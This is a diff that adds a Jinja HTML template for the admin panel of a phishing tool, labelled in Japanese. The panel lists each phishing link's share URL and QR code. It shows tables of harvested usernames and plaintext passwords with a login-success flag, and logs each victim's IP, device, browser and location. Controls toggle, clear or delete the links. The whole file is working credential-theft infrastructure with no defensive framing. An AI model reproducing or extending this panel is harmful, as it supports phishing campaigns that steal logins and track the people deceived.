@@ -1,0 +1,76 @@
+{% extends "base.html" %}
+{% block title %}{{ link.name }} — 抜き取り{% endblock %}
+{% block head %}
+<style>
+.wrap{max-width:900px;margin:0 auto}
+h1{font-size:18px;margin:0 0 6px}
+.bot{color:#8b93a7;font-size:11px}
+table{width:100%;border-collapse:collapse;font-size:12px}
+th,td{border-bottom:1px solid #1d212c;padding:6px 4px;text-align:left;vertical-align:top}
+th{color:#8b93a7;font-weight:500}
+code{background:#232734;padding:1px 5px;border-radius:4px;font-size:11px}
+.cred{color:#7ee08a;font-weight:700}
+.gps{color:#7ee08a}.ip{color:#f0b429}
+.btn{display:inline-block;padding:8px 14px;border-radius:8px;background:#2b3346;
+  color:#e6e9ef;text-decoration:none;font-size:12px;border:0;cursor:pointer}
+.flex{display:flex;gap:8px;flex-wrap:wrap}
+</style>
+{% endblock %}
+{% block content %}
+<div class="wrap">
+<h1>{{ link.name }}</h1>
+<div class="bot" style="margin-bottom:10px">
+  {{ '有効' if link.active else '停止中' }} / hit {{ link.hit_count }}<br>
+  飛び先 <code>{{ link.dest }}</code><br>
+  共有URL <code>{{ url }}</code>
+</div>
+<div class="flex" style="margin-bottom:12px">
+  <a class="btn" href="{{ url }}" target="_blank">開く</a>
+  <a class="btn" href="{{ base }}/phish/{{ link.code }}/qr.png" target="_blank">QR</a>
+  <a class="btn" href="{{ base }}/phish">一覧へ戻る</a>
+</div>
+
+<h3 style="font-size:13px;margin:18px 0 6px;color:#c7cddb">抜き取り（{{ creds|length }}件）</h3>
+<table>
+  <tr><th>時刻</th><th>ID</th><th>パスワード</th><th>結果</th><th>IP</th></tr>
+  {% for c in creds %}
+  <tr>
+    <td class="bot">{{ (c.ts or '')[:19] }}</td>
+    <td><span class="cred">{{ c.user_val or c.user_mask or '-' }}</span></td>
+    <td><code>{{ c.pass_val or c.pass_mask or '-' }}</code></td>
+    <td>{% if c.ok %}<span class="gps">成功</span>{% elif c.ok == 0 %}<span class="ip">不一致</span>{% else %}<span class="bot">不明</span>{% endif %}</td>
+    <td class="bot">{{ c.hit_id }}</td>
+  </tr>
+  {% else %}
+  <tr><td colspan="5" class="bot">まだありません</td></tr>
+  {% endfor %}
+</table>
+
+<h3 style="font-size:13px;margin:18px 0 6px;color:#c7cddb">踏み（{{ hits|length }}件）</h3>
+<table>
+  <tr><th>時刻</th><th>端末</th><th>場所</th><th>IP</th></tr>
+  {% for h in hits %}
+  <tr>
+    <td class="bot">{{ (h.ts or '')[:19] }}</td>
+    <td class="bot">{{ h.device }} / {{ h.os }} / {{ h.browser }}{% if h.inapp %}（{{ h.inapp }}）{% endif %}</td>
+    <td class="bot">{{ h.city }} {{ h.region }} {{ h.country }}</td>
+    <td class="bot">{{ h.ip }}</td>
+  </tr>
+  {% else %}
+  <tr><td colspan="4" class="bot">まだありません</td></tr>
+  {% endfor %}
+</table>
+
+<h3 style="font-size:13px;margin:18px 0 6px;color:#c7cddb">操作</h3>
+<div class="flex">
+  <form method="post" action="{{ base }}/phish/{{ link.code }}/toggle">
+    <button class="btn" type="submit">{{ '停止する' if link.active else '有効にする' }}</button></form>
+  <form method="post" action="{{ base }}/phish/{{ link.code }}/clear"
+        onsubmit="return confirm('抜き取りだけ消しますか？')">
+    <button class="btn" type="submit">抜き取りを消す</button></form>
+  <form method="post" action="{{ base }}/phish/{{ link.code }}/delete"
+        onsubmit="return confirm('リンクごと削除しますか？')">
+    <button class="btn" type="submit">削除</button></form>
+</div>
+</div>
+{% endblock %}
